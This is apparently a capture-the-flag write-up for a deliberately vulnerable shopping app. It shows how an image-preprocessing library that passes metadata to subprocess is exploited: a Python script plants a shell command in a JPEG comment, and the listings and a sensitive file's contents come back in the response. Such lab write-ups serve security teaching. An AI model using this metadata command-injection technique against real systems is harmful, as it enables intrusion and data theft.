# Objectives

Compromise the product search functionality using the file upload option to get the sensitive information file.

# Solutions

Firstly, let's see what happens when we upload a picture. We can see the page is loading and generating similar products. if we try to look at the requests that were made, we can see this:

![image](https://github.com/user-attachments/assets/8541ad33-0f6f-4c8a-a9d7-a8e1fd0862ba)

As you can see, we have one error. When we go look at it we see the following message:

```
"Error preprocessing images: An error occurred while trying to preprocess the images. Please try again later.\n For more details, visit our GitHub repository: https://github.com/orcasecurity-research/image-preprocessing-ai-goat"
```

Well we know we need to compromise a functionality in the image search process, and we just got a link to a github with some of the code, so let's go check it out!

The given library is quite small, and the obvious vulnerability pops right up - someone decided to read the metadata of the image, and execute it via subprocess.

![image](https://github.com/user-attachments/assets/f77b75b0-6c7a-484a-bcab-b945e90384c5)

so it seems like all we need to do is to insert there the command we want to be preformed. 

we use PIL to generate an image and insert a command into its metadata - 'ls -l /home/ec2-user' :

```
from PIL import Image, JpegImagePlugin

image = Image.new('RGB', (100, 100), color=(73, 109, 137))

metadata_comment = 'ls -l /home/ec2-user'

image.save('vulnerable_image.jpeg', "JPEG", quality=95, comment=metadata_comment)
```

then when uploading to the website, we get an error for analyze-photo, but in the response we get the output of the command we sent. 

the output we got is - 

```
total 120
-rw-r--r-- 1 ec2-user ec2-user 15221 Jul 30 12:23 app.py
-rw-r--r-- 1 ec2-user ec2-user  2745 Jul 30 12:23 categories.json
-rw-r--r-- 1 ec2-user ec2-user  8987 Jul 30 12:23 migrate_data.py
-rw-r--r-- 1 ec2-user ec2-user  8658 Jul 30 12:23 models.py
-rw-r--r-- 1 ec2-user ec2-user 61877 Jul 30 12:23 products.json
drwxr-xr-x 2 root     root        84 Jul 30 12:27  __pycache__
-rw-r--r-- 1 ec2-user ec2-user   102 Jul 30 12:23 requirements.txt
-rw-r--r-- 1 ec2-user ec2-user    89 Jul 30 12:23 user_data.json
-rw-r--r-- 1 ec2-user ec2-user   868 Jul 30 12:23 vulnerable_image_processor.py
```
We know we are looking for some sensitive information, so we'll try at the user's home folder now and get: 

```
total 8
drwxr-xr-x 3 root root  206 Jul 30 12:27 backend
-rw-r--r-- 1 root root   73 Jul 30 12:26 sensitive_data.txt
-rwxr-xr-x 1 root root 1323 Jul 30 12:23 setup.sh
```
and we have here a file named sensitive_data.txt! lets just read its contents: 

```
"{user_recommendations_dataset: sagemaker-recommendation-bucket-q37ltzqo}"
```
And that's it - we've succesfully finished the first challenge.


https://github.com/user-attachments/assets/e1aa8d50-e448-43e1-a014-3f9e18818a30

